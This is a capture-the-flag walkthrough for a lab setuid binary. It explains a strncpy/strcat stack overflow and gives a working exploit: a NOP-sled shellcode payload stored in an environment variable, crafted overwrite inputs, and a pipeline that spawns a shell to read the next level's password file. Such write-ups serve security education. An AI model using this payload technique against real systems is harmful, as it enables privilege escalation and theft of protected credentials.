bonus0 - walkthrough
====================

Target: /home/user/bonus0/bonus0   (setuid + setgid bonus1)
Goal:   read /home/user/bonus1/.pass

1. The bug
   p(dest, prompt) does read() into a big buffer, cuts at the first '\n', then
   strncpy(dest, buf, 20). strncpy does NOT NUL-terminate on a full 20-byte
   copy. pp() fills two adjacent 20-byte buffers a and b this way, then:
     strcpy(dest, a);            ; a unterminated -> keeps reading into b
     dest[strlen(dest)] = ' ';   ; 2-byte separator
     strcat(dest, b);
   main passes a ~42-byte buffer as dest, so the concatenation overruns it and
   overwrites main's saved return address.

   p() uses read(), which grabs everything available at once. The two prompts
   are separate reads, so the two lines must be sent with a pause between them,
   or the first read() eats both and the second hits EOF (crash in strchr).

2. Offset
   Send input1 = 20 A's, input2 = a cyclic pattern (with a pause between). The
   crash EIP locates the saved return address at bytes 9..12 of the SECOND
   input.

3. Shellcode in an env var (ASLR is off)
   The two inputs are far too small for shellcode, so put it behind a NOP sled
   in an env var and return into the sled. Landing anywhere in the 500-byte
   sled slides down into the shellcode, so the address need not be exact.

4. Payload  (Ressources/exploit.py)
     shell_code = b"\x90"*500 + asm(shellcraft.i386.sh())   # -> file "scode"
     line1 = b"A"*20 + b"\n"                                 # keeps offset at 9
     line2 = b"A"*9 + p32(0xbffffda0) + b"A"*7 + b"\n"       # ret at offset 9
   0xbffffda0 is a mid-sled address; it depends on the environment, so re-find
   it after exporting: gdb ./bonus0 -> run -> print/x getenv("EGG").

5. Run
     $ python3 Ressources/exploit.py
     $ export EGG="$(cat scode)"
     $ (cat line1; sleep 1; cat line2; sleep 1; echo 'cat /home/user/bonus1/.pass') | ./bonus0
   main returns into the sled, the shellcode spawns /bin/sh, and the command
   left in the pipe cats the flag.

